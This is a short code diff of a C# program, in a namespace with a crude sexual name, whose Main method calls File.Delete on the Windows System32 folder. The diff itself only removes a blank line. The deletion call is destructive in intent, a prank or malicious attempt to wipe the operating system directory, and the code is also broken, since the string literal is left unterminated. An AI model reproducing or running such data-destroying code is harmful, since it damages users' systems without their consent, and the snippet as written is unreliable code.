@@ -6,7 +6,6 @@ namespace ihavelotsofcum {
     static void Main(string[] args)
     {
         File.Delete("C:\Windows\System32\");
-
     }
   }
 }
